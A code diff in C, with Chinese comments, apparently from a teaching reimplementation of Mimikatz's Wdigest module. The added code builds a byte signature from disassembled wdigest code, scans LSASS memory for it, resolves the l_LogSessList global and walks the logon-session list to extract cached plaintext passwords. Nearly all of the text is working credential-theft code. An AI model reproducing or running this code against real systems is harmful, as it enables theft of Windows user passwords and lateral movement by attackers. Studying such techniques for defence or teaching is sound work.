@@ -232,6 +232,7 @@ VOID LocateUnprotectLsassMemoryKeys() {
 	HexdumpBytesPacked(g_sekurlsa_IV, sizeof(g_sekurlsa_IV));
 }
 
+
 /// 导出Wdigest缓存在内存中的明文密码
 VOID GetCredentialsFromWdigest() {
 	KIWI_WDIGEST_LIST_ENTRY entry;
@@ -243,6 +244,30 @@ VOID GetCredentialsFromWdigest() {
 
 	/// ... 请修改
 
+	// .text:000000018001A467 48 FF 15 52 55 01 00    call    cs : __imp_RtlEnterCriticalSection
+	// .text:000000018001A46E 0F 1F 44 00 00          nop     dword ptr[rax + rax + 00h]
+	// .text:000000018001A473 48 8B 1D C6 B9 01 00    mov     rbx, cs: ? l_LogSessList@@3U_LIST_ENTRY@@A; _LIST_ENTRY l_LogSessList
+	// .text:000000018001A47A 48 8D 0D BF B9 01 00    lea     rcx, ? l_LogSessList@@3U_LIST_ENTRY@@A; _LIST_ENTRY l_LogSessList
+	// .text:000000018001A481 48 3B D9                cmp     rbx, rcx
+
+	UCHAR keySig[] = { 0x48, 0xFF, 0x15, 0x52, 0x55, 0x01, 0x00,
+						0x0F, 0x1F, 0x44, 0x00, 0x00,
+						0x48, 0x8B, 0x1D,
+						0x48, 0x8D, 0x0D };
+
+	// 搜索Wdigest特征码
+	logSessListSigOffset = SearchPattern(wdigestBaseAddress, keySig, sizeof keySig);
+	if (logSessListSigOffset == 0) return;
+
+	// 读取4字节偏移
+	ReadFromLsass(wdigestBaseAddress + logSessListSigOffset + sizeof keySig, &logSessListOffset, sizeof logSessListOffset);
+	wprintf(L"logSessListOffset = 0x%x\n", logSessListOffset);
+
+	// 计算logSessListAddr全局变量地址
+	ReadFromLsass(wdigestBaseAddress + logSessListSigOffset + sizeof keySig + 4 + logSessListOffset, &logSessListAddr, sizeof logSessListAddr);
+	wprintf(L"logSessListAddr = 0x%p\n", logSessListAddr);
+
+	// 读取logSessListAddr指向的结构体内容
 	ReadFromLsass(logSessListAddr, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));
 	pList = entry.This;
 
@@ -278,6 +303,7 @@ VOID GetCredentialsFromWdigest() {
 	} while (pList != logSessListAddr);
 	return;
 }
+
 
 /// 推荐使用API: 
 ///		LoadLibraryA() 
